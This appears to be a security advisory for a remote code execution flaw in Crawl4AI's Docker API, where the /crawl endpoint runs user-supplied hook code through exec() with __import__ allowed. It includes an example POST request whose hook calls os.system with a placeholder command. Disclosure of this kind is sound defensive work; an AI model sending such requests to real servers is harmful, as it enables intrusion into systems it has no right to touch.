title: "Crawl4AI is Vulnerable to Remote Code Execution in Docker API via Hooks Parameter"
description: "A critical remote code execution vulnerability exists in the Crawl4AI
  Docker API deployment. The `/crawl` endpoint accepts a `hooks` parameter containing
  Python code that is executed using `exec()`. The `__import__` builtin was included
  in the allowed builtins, allowing attackers to import arbitrary modules and execute
  system commands.\n\n**Attack Vector:**\n```json\nPOST /crawl\n{\n\"urls\": [\"https://example.com\"],\n\"hooks\":
  {\n\"code\": {\n\"on_page_context_created\": \"async def hook(page, context, **kwargs):\\n
  \   __import__('os').system('malicious_command')\\n    return page\"\n}\n}\n}\n```"
